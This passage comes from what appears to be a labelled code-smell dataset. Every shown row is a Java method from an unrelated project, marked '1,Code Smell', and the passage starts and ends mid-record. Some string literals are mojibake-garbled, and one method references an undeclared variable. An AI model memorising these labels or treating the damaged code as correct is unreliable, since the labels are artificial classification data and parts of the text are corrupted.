        m=m.withComments(ListUtils.concatAll(m.getComments(),modifierComments));
      }
      m=maybeAutoFormat(m,m.withModifiers(modifiers),p).withBody(m.getBody());
    }
  }
  return m;
}",1,Code Smell
"/** 
 * Reads a character from the underlying stream.
 */
int readChar() throws IOException {
  int ch=read();
  if (ch == '<' || ch < 0) {
    _peek=ch;
    return -1;
  }
  if (ch == '&') {
    ch=read();
    if (ch == '#') {
      ch=read();
      if (ch >= '0' && ch <= '9') {
        int v=0;
        for (; ch >= '0' && ch <= '9'; ch=read()) {
          v=10 * v + ch - '0';
        }
        if (ch != ';')         throw error(""expected ';' at "" + (char)ch);
        return (char)v;
      }
 else       throw error(""expected digit at "" + (char)ch);
    }
 else {
      _entityBuffer.setLength(0);
      for (; ch >= 'a' && ch <= 'z'; ch=read())       _entityBuffer.append((char)ch);
      String entity=_entityBuffer.toString();
      if (ch != ';')       throw expectedChar(""';'"",ch);
      if (entity.equals(""amp""))       return '&';
 else       if (entity.equals(""apos""))       return '\'';
 else       if (entity.equals(""quot""))       return '""';
 else       if (entity.equals(""lt""))       return '<';
 else       if (entity.equals(""gt""))       return '>';
 else       throw new BurlapProtocolException(""unknown XML entity &"" + entity + ""; at `""+ (char)ch+ ""'"");
    }
  }
 else   if (ch < 0x80)   return (char)ch;
 else   if ((ch & 0xe0) == 0xc0) {
    int ch1=read();
    int v=((ch & 0x1f) << 6) + (ch1 & 0x3f);
    return (char)v;
  }
 else   if ((ch & 0xf0) == 0xe0) {
    int ch1=read();
    int ch2=read();
    int v=((ch & 0x0f) << 12) + ((ch1 & 0x3f) << 6) + (ch2 & 0x3f);
    return (char)v;
  }
 else   throw new BurlapProtocolException(""bad utf-8 encoding"");
}",1,Code Smell
"@Override public List<FlowOperationView> getAuditRecord(String processInstanceId){
  List<FlowOperation> operations=flowOperationService.list(Wrappers.<FlowOperation>lambdaQuery().eq(FlowOperation::getInstanceId,processInstanceId).eq(FlowOperation::getTaskType,FlowTaskType.userTask).orderByAsc(FlowOperation::getCreateAt));
  List<FlowOperationView> operationViews=flowOperationModelMapper.toView(operations);
  FlowInstance flowInstance=flowInstanceService.getById(processInstanceId);
  if (FlowInstanceStatus.APPROVING == flowInstance.getStatus()) {
    Execution execution=runtimeService.createExecutionQuery().processInstanceId(processInstanceId).onlyChildExecutions().singleResult();
    if (execution != null) {
      FlowOperationView runningOperationView=new FlowOperationView();
      runningOperationView.setActivityId(execution.getActivityId());
      runningOperationView.setApprovalType(FlowApprovalType.TODO);
      operationViews.add(runningOperationView);
      List<Task> tasks=taskService.createTaskQuery().processInstanceId(processInstanceId).includeIdentityLinks().list();
      Set<String> waitAuditUserIds=new LinkedHashSet<>();
      tasks.forEach(t -> {
        if (t.getAssignee() != null) {
          waitAuditUserIds.add(t.getAssignee());
        }
        t.getIdentityLinks().forEach(link -> {
          waitAuditUserIds.add(link.getUserId());
        }
);
      }
);
      runningOperationView.setWaitAuditUserList(waitAuditUserIds.stream().map(uid -> userService.loadUserById(uid)).collect(Collectors.toList()));
    }
  }
 else   if (FlowInstanceStatus.SUSPENDED == flowInstance.getStatus()) {
    FlowOperationView runningOperationView=new FlowOperationView();
    runningOperationView.setActivityId(FlowConstant.STARTER_ACTIVITY_ID);
    runningOperationView.setActivityName(FlowConstant.STARTER_ACTIVITY_NAME);
    runningOperationView.setApprovalType(FlowApprovalType.TODO);
    runningOperationView.setWaitAuditUserList(Collections.singletonList(userService.loadUserById(flowInstance.getCreateBy())));
    operationViews.add(runningOperationView);
  }
  operationViews.forEach(view -> {
    if (view.getCreateBy() != null) {
      view.setAuditUser(userService.loadUserById(view.getCreateBy()));
    }
    if (view.getActivityId() != null) {
      FlowEntryNode node=entryNodeService.getById(view.getActivityId());
      if (node != null) {
        view.setActivityName(node.getName());
      }
    }
    if (view.getNewActivityId() != null) {
      if (FlowConstant.STARTER_ACTIVITY_ID.equals(view.getNewActivityId())) {
        view.setNewActivityName(FlowConstant.STARTER_ACTIVITY_NAME);
      }
 else {
        FlowEntryNode node=entryNodeService.getById(view.getNewActivityId());
        if (node != null) {
          view.setNewActivityName(node.getName());
        }
      }
    }
    if (view.getApprovalType() != null) {
      view.setApprovalTypeName(FlowApprovalType.DICT_MAP.get(view.getApprovalType()));
    }
    if (!StringUtils.hasText(view.getActivityName()) && FlowApprovalType.SAVE.equals(view.getApprovalType())) {
      view.setActivityName(""鐢宠浜�"");
    }
  }
);
  return operationViews;
}
",1,Code Smell
"/** 
 * 查找目标Context
 * @param stack
 * @param context
 * @return
 */
private ContextInstanceWrapper findTargetContext(Stack<ContextInstanceWrapper> stack,Context context){
  if (stack == null || context == null) {
    LogUtil.w(TAG,""无意义查找"");
    return null;
  }
  ReentrantReadWriteLock.ReadLock readLock=null;
  if (stack == openedActivity) {
    readLock=ACTIVITY_STACK_LOCK.readLock();
  }
 else   if (stack == openedService) {
    readLock=SERVICE_STACK_LOCK.readLock();
  }
  if (readLock != null) {
    readLock.lock();
  }
  for (  ContextInstanceWrapper target : stack) {
    if (target.isTargetContext(context)) {
      if (readLock != null) {
        readLock.unlock();
      }
      return target;
    }
  }
  if (readLock != null) {
    readLock.unlock();
  }
  return null;
}
",1,Code Smell
"@RequiresApi(api=Build.VERSION_CODES.Q) private static Uri saveFileInternal(int type,File sourceFile,String filename){
  try {
    int selectedType=type;
    ContentValues contentValues=new ContentValues();
    String extension=FileLoader.getFileExtension(sourceFile);
    String mimeType=null;
    if (extension != null) {
      mimeType=MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
    }
    Uri uriToInsert=null;
    if ((type == 0 || type == 1) && mimeType != null) {
      if (mimeType.startsWith(""image"")) {
        selectedType=0;
      }
      if (mimeType.startsWith(""video"")) {
        selectedType=1;
      }
    }
    final String folderName=NekoConfig.customSavePath.String();
    if (selectedType == 0) {
      if (filename == null) {
        filename=AndroidUtilities.generateFileName(0,extension);
      }
      uriToInsert=MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      File dirDest=new File(Environment.DIRECTORY_PICTURES,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      contentValues.put(MediaStore.Images.Media.DISPLAY_NAME,filename);
      contentValues.put(MediaStore.Images.Media.MIME_TYPE,mimeType);
    }
 else     if (selectedType == 1) {
      if (filename == null) {
        filename=AndroidUtilities.generateFileName(1,extension);
      }
      File dirDest=new File(Environment.DIRECTORY_MOVIES,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Video.Media.DISPLAY_NAME,filename);
    }
 else     if (selectedType == 2) {
      if (filename == null) {
        filename=sourceFile.getName();
      }
      File dirDest=new File(Environment.DIRECTORY_DOWNLOADS,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Downloads.DISPLAY_NAME,filename);
    }
 else {
      if (filename == null) {
        filename=sourceFile.getName();
      }
      File dirDest=new File(Environment.DIRECTORY_MUSIC,folderName);
      contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH,dirDest + File.separator);
      uriToInsert=MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
      contentValues.put(MediaStore.Audio.Media.DISPLAY_NAME,filename);
    }
    contentValues.put(MediaStore.MediaColumns.MIME_TYPE,mimeType);
    Uri dstUri=ApplicationLoader.applicationContext.getContentResolver().insert(uriToInsert,contentValues);
    if (dstUri != null) {
      FileInputStream fileInputStream=new FileInputStream(sourceFile);
      OutputStream outputStream=ApplicationLoader.applicationContext.getContentResolver().openOutputStream(dstUri);
      AndroidUtilities.copyFile(fileInputStream,outputStream);
      fileInputStream.close();
    }
    return dstUri;
  }
 catch (  Exception e) {
    FileLog.e(e);
    return null;
  }
}",1,Code Smell
"public void stopRecording(final int send,boolean notify,int scheduleDate,boolean once){
  if (recordStartRunnable != null) {
    recordQueue.cancelRunnable(recordStartRunnable);
    recordStartRunnable=null;
  }
  recordQueue.postRunnable(() -> {
    if (sendAfterDone == 3) {
      sendAfterDone=0;
      stopRecordingInternal(send,notify,scheduleDate,once);
      return;
    }
    if (audioRecorder == null) {
      recordingAudio=null;
      manualRecording=false;
      raiseToEarRecord=false;
      ignoreOnPause=false;
      return;
    }
    try {
      sendAfterDone=send;
      sendAfterDoneNotify=notify;
      sendAfterDoneScheduleDate=scheduleDate;
      sendAfterDoneOnce=once;
      audioRecorder.stop();
      setBluetoothScoOn(false);
    }
 catch (    Exception e) {
      FileLog.e(e);
      if (recordingAudioFile != null) {
        if (BuildVars.LOGS_ENABLED) {
          FileLog.e(""delete voice file"");
        }
        recordingAudioFile.delete();
      }
    }
    if (send == 0) {
      stopRecordingInternal(0,false,0,false);
    }
    if (!NekoConfig.disableVibration.Bool()) {
      try {
        feedbackView.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP,HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING);
      }
 catch (      Exception ignore) {
      }
    }
    AndroidUtilities.runOnUIThread(() -> NotificationCenter.getInstance(recordingCurrentAccount).postNotificationName(NotificationCenter.recordStopped,recordingGuid,send == 2 ? 1 : 0));
  }
);
}",1,Code Smell
"/** 
 * Handles the block interaction when a player right-clicks a block.
 * @param session the session interacting with the block
 * @param position the position of the block
 * @param state the state of the block
 */
static void handleBlockInteraction(GeyserSession session,Vector3f position,BlockState state){
  String handIdentifier=null;
  for (  Map.Entry<SoundTranslator,SoundInteractionTranslator<?>> interactionEntry : Registries.SOUND_TRANSLATORS.get().entrySet()) {
    if (!(interactionEntry.getValue() instanceof BlockSoundInteractionTranslator)) {
      continue;
    }
    if (interactionEntry.getKey().blocks().length != 0) {
      boolean contains=false;
      for (      String blockIdentifier : interactionEntry.getKey().blocks()) {
        if (state.toString().contains(blockIdentifier)) {
          contains=true;
          break;
        }
      }
      if (!contains)       continue;
    }
    GeyserItemStack itemInHand=session.getPlayerInventory().getItemInHand();
    if (interactionEntry.getKey().items().length != 0) {
      if (itemInHand.isEmpty()) {
        continue;
      }
      if (handIdentifier == null) {
        handIdentifier=itemInHand.asItem().javaIdentifier();
      }
      boolean contains=false;
      for (      String itemIdentifier : interactionEntry.getKey().items()) {
        if (handIdentifier.contains(itemIdentifier)) {
          contains=true;
          break;
        }
      }
      if (!contains)       continue;
    }
    if (session.isSneaking() && !interactionEntry.getKey().ignoreSneakingWhileHolding()) {
      if (!itemInHand.isEmpty()) {
        continue;
      }
    }
    ((BlockSoundInteractionTranslator)interactionEntry.getValue()).translate(session,position,state);
  }
}",1,Code Smell
"public void loadConfig(boolean useCache,LoadConfigCallback callback,Activity activity){
  String apiUrl=Hawk.get(HawkConfig.API_URL,"""");
  if (apiUrl.isEmpty()) {
    callback.error(""-1"");
    return;
  }
  File cache=new File(App.getInstance().getFilesDir().getAbsolutePath() + ""/"" + MD5.encode(apiUrl));
  if (useCache && cache.exists()) {
    try {
      parseJson(apiUrl,cache);
      callback.success();
      return;
    }
 catch (    Throwable th) {
      th.printStackTrace();
    }
  }
  String apiFix=apiUrl;
  if (apiUrl.startsWith(""clan://"")) {
    apiFix=clanToAddress(apiUrl);
  }
  OkGo.<String>get(apiFix).execute(new AbsCallback<String>(){
    @Override public void onSuccess(    Response<String> response){
      try {
        String json=response.body();
        parseJson(apiUrl,response.body());
        try {
          File cacheDir=cache.getParentFile();
          if (!cacheDir.exists())           cacheDir.mkdirs();
          if (cache.exists())           cache.delete();
          FileOutputStream fos=new FileOutputStream(cache);
          fos.write(json.getBytes(""UTF-8""));
          fos.flush();
          fos.close();
        }
 catch (        Throwable th) {
          th.printStackTrace();
        }
        callback.success();
      }
 catch (      Throwable th) {
        th.printStackTrace();
        callback.error(""瑙ｆ瀽閰嶇疆澶辫触"");
      }
    }
    @Override public void onError(    Response<String> response){
      super.onError(response);
      if (cache.exists()) {
        try {
          parseJson(apiUrl,cache);
          callback.success();
          return;
        }
 catch (        Throwable th) {
          th.printStackTrace();
        }
      }
      callback.error(""鎷夊彇閰嶇疆澶辫触\n"" + (response.getException() != null ? response.getException().getMessage() : """"));
    }
    public String convertResponse(    okhttp3.Response response) throws Throwable {
      String result="""";
      if (response.body() == null) {
        result="""";
      }
 else {
        result=response.body().string();
      }
      if (apiUrl.startsWith(""clan"")) {
        result=clanContentFix(clanToAddress(apiUrl),result);
      }
      return result;
    }
  }
);
}",1,Code Smell
"public static Bitmap decodeStream(@NonNull InputStreamPipe isp,int maxWidth,int maxHeight,int pixels,boolean checkMemory,boolean justCalc,int[] sampleSize){
  try {
    isp.obtain();
    BitmapFactory.Options options=new BitmapFactory.Options();
    options.inJustDecodeBounds=true;
    BitmapFactory.decodeStream(isp.open(),null,options);
    isp.close();
    int width=options.outWidth;
    int height=options.outHeight;
    if (width <= 0 || height <= 0) {
      if (sampleSize != null && sampleSize.length >= 1) {
        sampleSize[0]=-1;
      }
      return null;
    }
    int scaleW=1;
    int scaleH=1;
    int scaleP=1;
    int scaleM=1;
    if (maxWidth > 0 && width > maxWidth) {
      scaleW=MathUtils.ceilDivide(width,maxWidth);
    }
    if (maxHeight > 0 && height > maxHeight) {
      scaleH=MathUtils.ceilDivide(height,maxHeight);
    }
    if (pixels > 0 && width * height > pixels) {
      scaleP=(int)Math.ceil(Math.sqrt(width * height / (float)pixels));
    }
    if (checkMemory) {
      long m=availableMemory() - 5 * 1024 * 1024;
      if (m < 0) {
        if (sampleSize != null && sampleSize.length >= 1) {
          sampleSize[0]=-1;
        }
        return null;
      }
      if (width * height * 3 > m) {
        scaleM=(int)Math.ceil(Math.sqrt(width * height * 3 / (float)m));
      }
    }
    options.inSampleSize=MathUtils.nextPowerOf2(MathUtils.max(scaleW,scaleH,scaleP,scaleM,1));
    if (sampleSize != null && sampleSize.length >= 1) {
      sampleSize[0]=options.inSampleSize;
    }
    options.inJustDecodeBounds=false;
    if (justCalc) {
      return null;
    }
 else {
      try {
        return BitmapFactory.decodeStream(isp.open(),null,options);
      }
 catch (      OutOfMemoryError e) {
        if (sampleSize != null && sampleSize.length >= 1) {
          sampleSize[0]=-1;
        }
        return null;
      }
    }
  }
 catch (  IOException e) {
    if (sampleSize != null && sampleSize.length >= 1) {
      sampleSize[0]=-1;
    }
    return null;
  }
 finally {
    isp.close();
    isp.release();
  }
}
/** 
 * @return null or the bitmap
 */
public static Bitmap decodeStream(@NonNull InputStreamPipe isp,int maxWidth,int maxHeight){
  return decodeStream(isp,maxWidth,maxHeight,-1,false,false,null);
}",1,Code Smell
"private static void analysis(String line,List<CommandPart> commandParts){
  int length=line.length();
  boolean startPipe=true;
  int commandStart=0;
  int pipeStart=0;
  for (int i=0; i < length; i++) {
    char c=line.charAt(i);
    if (startPipe && (!isLetter(c))) {
      throw new RuntimeException(""Illegal command start"");
    }
    startPipe=false;
    if (isEscape(c) && i < length - 1) {
      i++;
      continue;
    }
    if (isQuotation(c)) {
      i=analysisQuotation(i,line);
      if (i == -1) {
        throw new RuntimeException(""Quotes are not closed properly"");
      }
      if (i == length - 1) {
        commandParts.add(new CommandPart(PartType.command,line.substring(commandStart,i + 1)));
      }
      continue;
    }
    if (c == '$') {
      throw new RuntimeException(""Illegal character [$] in command, please check command"");
    }
    if (c == '>') {
      throw new RuntimeException(""Illegal character [>] in command, please check command"");
    }
    if (c == '<') {
      throw new RuntimeException(""Illegal character [<] in command, please check command"");
    }
    if (isPipe(c)) {
      commandParts.add(new CommandPart(PartType.command,line.substring(commandStart,i)));
      pipeStart=i;
      i=skipPipe(i + 1,line);
      final String pipe=line.substring(pipeStart,i + 1);
      commandParts.add(new CommandPart(PartType.separator,pipe));
      i=skipWhitespace(i + 1,line);
      startPipe=true;
      commandStart=i + 1;
      continue;
    }
    if (i == length - 1) {
      commandParts.add(new CommandPart(PartType.command,line.substring(commandStart,i + 1)));
    }
  }
}",1,Code Smell
"@Override public void translate(GeyserSession session,ClientboundSetPassengersPacket packet){
  Entity entity=session.getEntityCache().getEntityByJavaId(packet.getEntityId());
  if (entity == null)   return;
  List<Entity> newPassengers=new ArrayList<>();
  for (  int passengerId : packet.getPassengerIds()) {
    Entity passenger=session.getEntityCache().getEntityByJavaId(passengerId);
    if (passenger == session.getPlayerEntity()) {
      session.getPlayerEntity().setVehicle(entity);
      session.confirmTeleport(passenger.getPosition().sub(0,EntityDefinitions.PLAYER.offset(),0).toDouble());
      if (entity instanceof ClientVehicle) {
        clientVehicle.getVehicleComponent().onMount();
      }
    }
    if (passenger == null) {
      continue;
    }
    boolean rider=packet.getPassengerIds()[0] == passengerId;
    EntityLinkData.Type type=rider ? EntityLinkData.Type.RIDER : EntityLinkData.Type.PASSENGER;
    SetEntityLinkPacket linkPacket=new SetEntityLinkPacket();
    linkPacket.setEntityLink(new EntityLinkData(entity.getGeyserId(),passenger.getGeyserId(),type,false,false,0f));
    session.sendUpstreamPacket(linkPacket);
    newPassengers.add(passenger);
    passenger.setVehicle(entity);
    EntityUtils.updateRiderRotationLock(passenger,entity,true);
    EntityUtils.updateMountOffset(passenger,entity,rider,true,(packet.getPassengerIds().length > 1));
    passenger.updateBedrockMetadata();
  }
  for (  Entity passenger : entity.getPassengers()) {
    if (passenger == null) {
      continue;
    }
    if (!newPassengers.contains(passenger)) {
      SetEntityLinkPacket linkPacket=new SetEntityLinkPacket();
      linkPacket.setEntityLink(new EntityLinkData(entity.getGeyserId(),passenger.getGeyserId(),EntityLinkData.Type.REMOVE,false,false,0f));
      session.sendUpstreamPacket(linkPacket);
      passenger.setVehicle(null);
      EntityUtils.updateRiderRotationLock(passenger,entity,false);
      EntityUtils.updateMountOffset(passenger,entity,false,false,(packet.getPassengerIds().length > 1));
      passenger.updateBedrockMetadata();
      if (passenger == session.getPlayerEntity()) {
        if (session.getMountVehicleScheduledFuture() != null) {
          session.getMountVehicleScheduledFuture().cancel(false);
        }
        if (entity instanceof ClientVehicle) {
          clientVehicle.getVehicleComponent().onDismount();
        }
      }
    }
  }
  entity.setPassengers(newPassengers);
switch (entity.getDefinition().entityType()) {
case HORSE:
{
      entity.getDirtyMetadata().put(EntityDataTypes.SEAT_ROTATION_OFFSET_DEGREES,181.0f);
      entity.updateBedrockMetadata();
    }
}
}",1,Code Smell
"public synchronized void start(){
  try {
    if (mActivity == null) {
      if (mAutoRelease) {
        onSniffingError(mWebView,mUrl,mPosition,-1);
      }
 else       if (mCallback != null) {
        mCallback.onSniffingError(mWebView,mUrl,mPosition,-1);
      }
      return;
    }
    if (mHeader == null) {
      mHeader=new HashMap<>();
    }
    Activity activity=mActivity.get();
    if (mWebView == null && activity != null) {
      mCallbackChange=true;
      mWebView=new SniffingWebView(activity);
    }
    if (mCallbackChange && mWebView != null) {
      mCallbackChange=false;
      SniffingCallback callback=mAutoRelease ? this : mCallback;
      mClient=new SniffingWebViewClient(mWebView,mUrl,mPosition,mHeader,mFilter,callback);
      mClient.setReadTimeOut(mReadTimeOut);
      mClient.setConnTimeOut(mConnTimeOut);
      mClient.setFinishedTimeOut(mFinishedTimeOut);
      SniffingWebChromeClient chromeClient=new SniffingWebChromeClient(mClient);
      mWebView.setWebViewClient(mClient);
      mWebView.setWebChromeClient(chromeClient);
    }
    if (mWebView != null && activity != null) {
      if (mWebView.getParent() == null) {
        ViewGroup mainView=(ViewGroup)activity.findViewById(android.R.id.content);
        if (WEB_VIEW_DEBUG) {
          Display display=activity.getWindowManager().getDefaultDisplay();
          mWebView.setLayoutParams(new ViewGroup.LayoutParams(display.getWidth() / 2,display.getHeight() / 2));
        }
 else {
          mWebView.setLayoutParams(new ViewGroup.LayoutParams(1,1));
        }
        mainView.addView(mWebView);
      }
      mWebView.loadUrl(mUrl,mHeader);
    }
 else {
      if (mAutoRelease) {
        onSniffingError(mWebView,mUrl,mPosition,-1);
      }
 else       if (mCallback != null) {
        mCallback.onSniffingError(mWebView,mUrl,mPosition,-1);
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
    if (mAutoRelease) {
      onSniffingError(mWebView,mUrl,mPosition,-1);
    }
 else     if (mCallback != null) {
      mCallback.onSniffingError(mWebView,mUrl,mPosition,-1);
    }
  }
}",1,Code Smell
"private void openProximityAlert(){
  if (proximityCircle == null) {
    createCircle(500);
  }
 else {
    previousRadius=proximityCircle.getRadius();
  }
  TLRPC.User user;
  if (DialogObject.isUserDialog(dialogId)) {
    user=getMessagesController().getUser(dialogId);
  }
 else {
    user=null;
  }
  proximitySheet=new ProximitySheet(getParentActivity(),user,(move,radius) -> {
    if (proximityCircle != null) {
      proximityCircle.setRadius(radius);
      if (move) {
        moveToBounds(radius,true,true);
      }
    }
    if (DialogObject.isChatDialog(dialogId)) {
      return true;
    }
    for (int a=0, N=markers.size(); a < N; a++) {
      LiveLocation location=markers.get(a);
      if (location.object == null || UserObject.isUserSelf(location.user)) {
        continue;
      }
      TLRPC.GeoPoint point=location.object.media.geo;
      Location loc=new Location(""network"");
      loc.setLatitude(point.lat);
      loc.setLongitude(point._long);
      if (myLocation.distanceTo(loc) > radius) {
        return true;
      }
    }
    return false;
  }
,(move,radius) -> {
    LocationController.SharingLocationInfo info=getLocationController().getSharingLocationInfo(dialogId);
    if (info == null) {
      AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
      builder.setTitle(LocaleController.getString(""ShareLocationAlertTitle"",R.string.ShareLocationAlertTitle));
      builder.setMessage(LocaleController.getString(""ShareLocationAlertText"",R.string.ShareLocationAlertText));
      builder.setPositiveButton(LocaleController.getString(""ShareLocationAlertButton"",R.string.ShareLocationAlertButton),(dialog,id) -> shareLiveLocation(user,900,radius));
      builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
      showDialog(builder.create());
      return false;
    }
    proximitySheet.setRadiusSet();
    proximityButton.setImageResource(R.drawable.msg_location_alert2);
    getUndoView().showWithAction(0,UndoView.ACTION_PROXIMITY_SET,radius,user,null,null);
    getLocationController().setProximityLocation(dialogId,radius,true);
    return true;
  }
,() -> {
    if (map != null) {
      map.setPadding(AndroidUtilities.dp(70),0,AndroidUtilities.dp(70),AndroidUtilities.dp(10));
    }
    if (!proximitySheet.getRadiusSet()) {
      if (previousRadius > 0) {
        proximityCircle.setRadius(previousRadius);
      }
 else       if (proximityCircle != null) {
        proximityCircle.remove();
        proximityCircle=null;
      }
    }
    proximitySheet=null;
  }
);
  FrameLayout frameLayout=(FrameLayout)fragmentView;
  frameLayout.addView(proximitySheet,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT));
  proximitySheet.show();
}",1,Code Smell
"@EventHandler private void onRender(Render3DEvent event){
  count=0;
  if (mode.get() == Mode.Shader)   mesh.begin();
  for (  BlockEntity blockEntity : Utils.blockEntities()) {
    boolean interacted=interactedBlocks.contains(blockEntity.getPos());
    if (interacted && hideOpened.get())     continue;
    getBlockEntityColor(blockEntity);
    if (interacted && openedColor.get().a > 0) {
      lineColor.set(openedColor.get());
      sideColor.set(openedColor.get());
      sideColor.a=fillOpacity.get();
    }
    if (render) {
      double dist=PlayerUtils.squaredDistanceTo(blockEntity.getPos().getX() + 0.5,blockEntity.getPos().getY() + 0.5,blockEntity.getPos().getZ() + 0.5);
      double a=1;
      if (dist <= fadeDistance.get() * fadeDistance.get())       a=dist / (fadeDistance.get() * fadeDistance.get());
      int prevLineA=lineColor.a;
      int prevSideA=sideColor.a;
      lineColor.a*=a;
      sideColor.a*=a;
      if (tracers.get() && a >= 0.075) {
        event.renderer.line(RenderUtils.center.x,RenderUtils.center.y,RenderUtils.center.z,blockEntity.getPos().getX() + 0.5,blockEntity.getPos().getY() + 0.5,blockEntity.getPos().getZ() + 0.5,lineColor);
      }
      if (mode.get() == Mode.Box && a >= 0.075)       renderBox(event,blockEntity);
      lineColor.a=prevLineA;
      sideColor.a=prevSideA;
      if (mode.get() == Mode.Shader)       renderShader(event,blockEntity);
      count++;
    }
  }
  if (mode.get() == Mode.Shader)   PostProcessShaders.STORAGE_OUTLINE.endRender(() -> mesh.render(event.matrices));
}",1,Code Smell
"@Override public String getString(Randomly r){
  return getStringOfAlphabet(r,NUMERIC_ALPHABET);
}
@Override public String getString(Randomly r){
  return getStringOfAlphabet(r,ALPHANUMERIC_ALPHABET);
}
@Override public String getString(Randomly r){
  return getStringOfAlphabet(r,ALPHANUMERIC_SPECIALCHAR_ALPHABET);
}
@Override public String getString(Randomly r){
  if (smallBiasProbability()) {
    return Randomly.fromOptions(""TRUE"",""FALSE"",""0.0"",""-0.0"",""1e500"",""-1e500"");
  }
  if (cacheProbability()) {
    String s=r.getFromStringCache();
    if (s != null) {
      return s;
    }
  }
  int n=ALPHABET.length();
  StringBuilder sb=new StringBuilder();
  int chars=getStringLength(r);
  for (int i=0; i < chars; i++) {
    if (Randomly.getBooleanWithRatherLowProbability()) {
      char val=(char)r.getInteger();
      if (val != 0) {
        sb.append(val);
      }
    }
 else {
      sb.append(ALPHABET.charAt(getNextInt(0,n)));
    }
  }
  while (Randomly.getBooleanWithSmallProbability()) {
    String[][] pairs={{""{"",""}""},{""["",""]""},{""("","")""}};
    int idx=(int)Randomly.getNotCachedInteger(0,pairs.length);
    int left=(int)Randomly.getNotCachedInteger(0,sb.length() + 1);
    sb.insert(left,pairs[idx][0]);
    int right=(int)Randomly.getNotCachedInteger(left + 1,sb.length() + 1);
    sb.insert(right,pairs[idx][1]);
  }
  if (r.provider != null) {
    while (Randomly.getBooleanWithSmallProbability()) {
      if (sb.length() == 0) {
        sb.append(r.provider.get());
      }
 else {
        sb.insert((int)Randomly.getNotCachedInteger(0,sb.length()),r.provider.get());
      }
    }
  }
  String s=sb.toString();
  r.addToCache(s);
  return s;
}
public abstract String getString(Randomly r);
public String getString(){
  return stringGenerationStrategy.getString(this);
}",1,Code Smell
"@Override public void readFeatures(Consumer<SimpleFeature> next) throws Exception {
  long id=0;
  var tables=tableNames();
  for (int i=0; i < tables.size(); i++) {
    String table=tables.get(i);
    LOGGER.trace(""Naturalearth loading {}/{}: {}"",i,tables.size(),table);
    try (Statement statement=conn.createStatement()){
      @SuppressWarnings(""java:S2077"") ResultSet rs=statement.executeQuery(""SELECT * FROM %s;"".formatted(table));
      String[] column=new String[rs.getMetaData().getColumnCount()];
      int geometryColumn=-1;
      for (int c=0; c < column.length; c++) {
        String name=rs.getMetaData().getColumnName(c + 1);
        column[c]=name;
        if (""GEOMETRY"".equals(name)) {
          geometryColumn=c;
        }
      }
      if (geometryColumn >= 0) {
        while (rs.next()) {
          byte[] geometry=rs.getBytes(geometryColumn + 1);
          if (geometry == null) {
            continue;
          }
          Geometry latLonGeometry=GeoUtils.WKB_READER.read(geometry);
          SimpleFeature readerGeometry=SimpleFeature.create(latLonGeometry,HashMap.newHashMap(column.length - 1),sourceName,table,++id);
          for (int c=0; c < column.length; c++) {
            if (c != geometryColumn) {
              Object value=rs.getObject(c + 1);
              String key=column[c];
              readerGeometry.setTag(key,value);
            }
          }
          next.accept(readerGeometry);
        }
      }
    }
   }
}",1,Code Smell
"@GuardedBy(""mListItems"") private void setStorageAndCache(AppInfoViewModel.AppInfo appInfo){
  if (FeatureController.isUsageAccessEnabled()) {
    if (AppUsageStatsManager.requireReadPhoneStatePermission()) {
      ThreadUtils.postOnMainThread(() -> mRequestPerm.launch(Manifest.permission.READ_PHONE_STATE,granted -> {
        if (granted) {
          mAppInfoModel.loadAppInfo(mPackageInfo,mIsExternalApk);
        }
      }
));
    }
  }
  if (!SelfPermissions.checkUsageStatsPermission()) {
    ThreadUtils.postOnMainThread(() -> new MaterialAlertDialogBuilder(mActivity).setTitle(R.string.grant_usage_access).setMessage(R.string.grant_usage_acess_message).setPositiveButton(R.string.go,(dialog,which) -> {
      try {
        mActivityLauncher.launch(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS),result -> {
          if (SelfPermissions.checkUsageStatsPermission()) {
            FeatureController.getInstance().modifyState(FeatureController.FEAT_USAGE_ACCESS,true);
            mAppInfoModel.loadAppInfo(mPackageInfo,mIsExternalApk);
          }
        }
);
      }
 catch (      SecurityException ignore) {
      }
    }
).setNegativeButton(R.string.cancel,null).setNeutralButton(R.string.never_ask,(dialog,which) -> FeatureController.getInstance().modifyState(FeatureController.FEAT_USAGE_ACCESS,false)).setCancelable(false).show());
    return;
  }
  PackageSizeInfo sizeInfo=appInfo.sizeInfo;
  if (sizeInfo == null)   return;
synchronized (mListItems) {
    mListItems.add(ListItem.newGroupStart(getString(R.string.storage_and_cache)));
    mListItems.add(ListItem.newInlineItem(getString(R.string.app_size),getReadableSize(sizeInfo.codeSize)));
    mListItems.add(ListItem.newInlineItem(getString(R.string.data_size),getReadableSize(sizeInfo.dataSize)));
    mListItems.add(ListItem.newInlineItem(getString(R.string.cache_size),getReadableSize(sizeInfo.cacheSize)));
    if (sizeInfo.obbSize != 0) {
      mListItems.add(ListItem.newInlineItem(getString(R.string.obb_size),getReadableSize(sizeInfo.obbSize)));
    }
    if (sizeInfo.mediaSize != 0) {
      mListItems.add(ListItem.newInlineItem(getString(R.string.media_size),getReadableSize(sizeInfo.mediaSize)));
    }
    mListItems.add(ListItem.newInlineItem(getString(R.string.total_size),getReadableSize(sizeInfo.getTotalSize())));
  }
}",1,Code Smell
"/** 
 * Deserialization factory.
 * @param version The serialized object version.
 * @param className The class name.
 * @param message The serialized data.
 * @throws InvalidProtocolBufferException If the protobuf could not be parsed from the {@code message}.
 * @return The deserialized object.
 */
